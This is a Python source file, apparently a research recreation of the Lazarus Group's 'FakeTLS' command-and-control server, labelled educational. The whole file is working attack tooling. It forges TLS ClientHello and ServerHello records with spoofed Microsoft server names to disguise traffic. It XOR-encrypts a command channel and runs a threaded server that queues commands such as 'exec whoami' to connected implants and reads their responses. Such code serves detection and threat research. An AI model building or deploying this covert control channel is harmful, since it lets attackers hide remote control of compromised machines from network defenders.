# Lazarus Group - FakeTLS C2 Server
# Custom C2 protocol mimicking legitimate TLS ClientHello/ServerHello handshakes
# MITRE ATT&CK: T1071.001 (Web Protocols), T1573 (Encrypted Channel)

# For educational and research purposes only
# Author: Nour A
# Reference: https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-govt

import socket
import struct
import threading
import hashlib
import os
import sys
import json
import base64
import time
from datetime import datetime

# TLS 1.2 record types
TLS_HANDSHAKE = 0x16
TLS_APPLICATION_DATA = 0x17
TLS_ALERT = 0x15
TLS_CHANGE_CIPHER_SPEC = 0x14

# TLS versions
TLS_1_0 = b"\x03\x01"
TLS_1_2 = b"\x03\x03"

# Handshake types
HANDSHAKE_CLIENT_HELLO = 0x01
HANDSHAKE_SERVER_HELLO = 0x02

# cipher suites (mimicking real Chrome browser)
CIPHER_SUITES = [
    0x1301,  # TLS_AES_128_GCM_SHA256
    0x1302,  # TLS_AES_256_GCM_SHA384
    0x1303,  # TLS_CHACHA20_POLY1305_SHA256
    0xC02C,  # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
    0xC02B,  # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    0xC030,  # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    0xC02F,  # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
]


def xor_crypt(data, key):
    """XOR encryption for command channel"""
    out = bytearray(len(data))
    for i in range(len(data)):
        out[i] = data[i] ^ key[i % len(key)]
    return bytes(out)


def build_client_hello(server_name="www.microsoft.com"):
    """Build a fake TLS ClientHello that mimics a real browser.
    Lazarus's FakeTLS uses legitimate-looking ClientHello messages
    to blend C2 traffic with normal HTTPS.
    """
    # random bytes (32 bytes)
    client_random = os.urandom(32)

    # session ID (32 bytes)
    session_id = os.urandom(32)

    # cipher suites
    cipher_data = b""
    for cs in CIPHER_SUITES:
        cipher_data += struct.pack("!H", cs)

    # compression methods (only null)
    compression = b"\x01\x00"

    # SNI extension (server name indication)
    sni_data = server_name.encode()
    sni_extension = struct.pack("!H", 0x0000)  # type: server_name
    sni_list = struct.pack("!BH", 0x00, len(sni_data)) + sni_data
    sni_payload = struct.pack("!H", len(sni_list)) + sni_list
    sni_extension += struct.pack("!H", len(sni_payload)) + sni_payload

    # supported_versions extension
    sv_extension = struct.pack("!H", 0x002B)  # type: supported_versions
    sv_data = b"\x03" + TLS_1_2 + TLS_1_0
    sv_extension += struct.pack("!H", len(sv_data)) + sv_data

    # extensions
    extensions = sni_extension + sv_extension
    extensions_data = struct.pack("!H", len(extensions)) + extensions

    # ClientHello body
    body = TLS_1_2  # client version
    body += client_random
    body += struct.pack("!B", len(session_id)) + session_id
    body += struct.pack("!H", len(cipher_data)) + cipher_data
    body += compression
    body += extensions_data

    # Handshake header
    handshake = struct.pack("!B", HANDSHAKE_CLIENT_HELLO)
    handshake += struct.pack("!I", len(body))[1:]  # 3-byte length
    handshake += body

    # TLS record header
    record = struct.pack("!B", TLS_HANDSHAKE)
    record += TLS_1_0  # record version
    record += struct.pack("!H", len(handshake))
    record += handshake

    return record, client_random


def build_server_hello(client_random, session_id=None):
    """Build a fake ServerHello response."""
    server_random = os.urandom(32)
    if session_id is None:
        session_id = os.urandom(32)

    # select cipher suite
    selected_cipher = struct.pack("!H", CIPHER_SUITES[0])

    body = TLS_1_2
    body += server_random
    body += struct.pack("!B", len(session_id)) + session_id
    body += selected_cipher
    body += b"\x00"  # compression: null

    handshake = struct.pack("!B", HANDSHAKE_SERVER_HELLO)
    handshake += struct.pack("!I", len(body))[1:]
    handshake += body

    record = struct.pack("!B", TLS_HANDSHAKE)
    record += TLS_1_2
    record += struct.pack("!H", len(handshake))
    record += handshake

    return record, server_random


def wrap_application_data(data, key):
    """Wrap command data as TLS Application Data record.
    After the fake handshake, all C2 data is XOR-encrypted and
    wrapped in TLS Application Data records to look like encrypted
    HTTPS traffic on the wire.
    """
    encrypted = xor_crypt(data, key)

    record = struct.pack("!B", TLS_APPLICATION_DATA)
    record += TLS_1_2
    record += struct.pack("!H", len(encrypted))
    record += encrypted

    return record


def unwrap_application_data(record, key):
    """Extract and decrypt command from TLS Application Data record."""
    if len(record) < 5:
        return None

    record_type = record[0]
    if record_type != TLS_APPLICATION_DATA:
        return None

    length = struct.unpack("!H", record[3:5])[0]
    encrypted = record[5:5 + length]

    return xor_crypt(encrypted, key)


class FakeTLSC2Server:
    """FakeTLS C2 server that accepts implant connections.
    The server handles the fake TLS handshake, derives session keys,
    and manages encrypted command channels.
    """

    def __init__(self, host="0.0.0.0", port=443):
        self.host = host
        self.port = port
        self.sessions = {}
        self.running = False
        self.command_queue = {}

    def derive_session_key(self, client_random, server_random):
        """Derive session encryption key from randoms.
        In reality, this would use proper TLS PRF.
        FakeTLS uses a simplified key derivation.
        """
        combined = client_random + server_random
        return hashlib.sha256(combined).digest()[:16]

    def handle_implant(self, conn, addr):
        """Handle a single implant connection."""
        session_id = f"{addr[0]}:{addr[1]}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"  [{timestamp}] New implant: {session_id}")

        try:
            conn.settimeout(30)

            # Phase 1: receive fake ClientHello
            client_hello = conn.recv(4096)
            if len(client_hello) < 5 or client_hello[0] != TLS_HANDSHAKE:
                print(f"  [{session_id}] Invalid ClientHello")
                return

            # extract client random (offset: record header(5) + handshake(4) + version(2))
            client_random = client_hello[11:43]

            # Phase 2: send fake ServerHello
            server_hello, server_random = build_server_hello(client_random)
            conn.send(server_hello)

            # Phase 3: derive session key
            session_key = self.derive_session_key(client_random, server_random)
            self.sessions[session_id] = {
                "conn": conn,
                "key": session_key,
                "connected": timestamp,
                "last_seen": timestamp,
            }
            print(f"  [{session_id}] Handshake complete. Key: {session_key.hex()[:16]}...")

            # Phase 4: C2 command loop
            while self.running:
                # check for queued commands
                if session_id in self.command_queue and self.command_queue[session_id]:
                    cmd = self.command_queue[session_id].pop(0)
                    cmd_data = json.dumps(cmd).encode()
                    packet = wrap_application_data(cmd_data, session_key)
                    conn.send(packet)
                    print(f"  [{session_id}] Sent command: {cmd.get('type', '?')}")

                # receive beacon/response
                try:
                    data = conn.recv(4096)
                    if not data:
                        break

                    decrypted = unwrap_application_data(data, session_key)
                    if decrypted:
                        try:
                            response = json.loads(decrypted.decode())
                            print(f"  [{session_id}] Response: {json.dumps(response)[:80]}...")
                        except (json.JSONDecodeError, UnicodeDecodeError):
                            print(f"  [{session_id}] Raw data: {len(decrypted)} bytes")

                    self.sessions[session_id]["last_seen"] = \
                        datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                except socket.timeout:
                    continue

        except (ConnectionError, OSError) as e:
            print(f"  [{session_id}] Disconnected: {e}")
        finally:
            conn.close()
            if session_id in self.sessions:
                del self.sessions[session_id]

    def start(self):
        """Start the FakeTLS C2 server."""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        server.settimeout(1)
        self.running = True

        print(f"[+] FakeTLS C2 listening on {self.host}:{self.port}")
        print(f"[+] Mimicking: TLS 1.2 with AES_128_GCM_SHA256")
        print(f"[+] SNI: www.microsoft.com (for traffic blending)")
        print()

        try:
            while self.running:
                try:
                    conn, addr = server.accept()
                    t = threading.Thread(target=self.handle_implant,
                                        args=(conn, addr), daemon=True)
                    t.start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            print("\n[*] Shutting down C2...")
        finally:
            self.running = False
            server.close()
            self._print_session_summary()

    def _print_session_summary(self):
        print()
        print("=" * 50)
        print("FAKETLS C2 SESSION SUMMARY")
        print("=" * 50)
        print(f"  Active sessions: {len(self.sessions)}")
        for sid, info in self.sessions.items():
            print(f"    {sid} | Connected: {info['connected']} | "
                  f"Last: {info['last_seen']}")
        print("=" * 50)


def main():
    print("=" * 70)
    print("LAZARUS GROUP - FAKETLS C2 SERVER")
    print("Custom TLS-Mimicking C2 Protocol")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print()

    # demo: build and display protocol packets
    print("[DEMO] Protocol Packet Construction")
    print("-" * 50)

    # ClientHello
    ch_record, client_random = build_client_hello("login.microsoftonline.com")
    print(f"  ClientHello: {len(ch_record)} bytes")
    print(f"    Record Type: 0x{ch_record[0]:02X} (Handshake)")
    print(f"    Version: {ch_record[1]:02X}.{ch_record[2]:02X}")
    print(f"    Client Random: {client_random.hex()[:32]}...")
    print()

    # ServerHello
    sh_record, server_random = build_server_hello(client_random)
    print(f"  ServerHello: {len(sh_record)} bytes")
    print(f"    Server Random: {server_random.hex()[:32]}...")
    print()

    # session key derivation
    key = hashlib.sha256(client_random + server_random).digest()[:16]
    print(f"  Session Key: {key.hex()}")
    print()

    # Application Data (command)
    command = json.dumps({"type": "exec", "cmd": "whoami"}).encode()
    app_data = wrap_application_data(command, key)
    print(f"  Encrypted Command: {len(app_data)} bytes")
    print(f"    Record Type: 0x{app_data[0]:02X} (Application Data)")
    print(f"    Encrypted: {app_data[5:21].hex()}...")
    print()

    # Decrypt
    decrypted = unwrap_application_data(app_data, key)
    print(f"  Decrypted: {decrypted.decode()}")
    print()

    # start server
    host = "127.0.0.1"
    port = 8443
    if len(sys.argv) > 1:
        port = int(sys.argv[1])

    print(f"[*] Starting C2 on {host}:{port}")
    print(f"[*] Press Ctrl+C to stop")
    print()

    c2 = FakeTLSC2Server(host=host, port=port)
    c2.start()


if __name__ == "__main__":
    main()
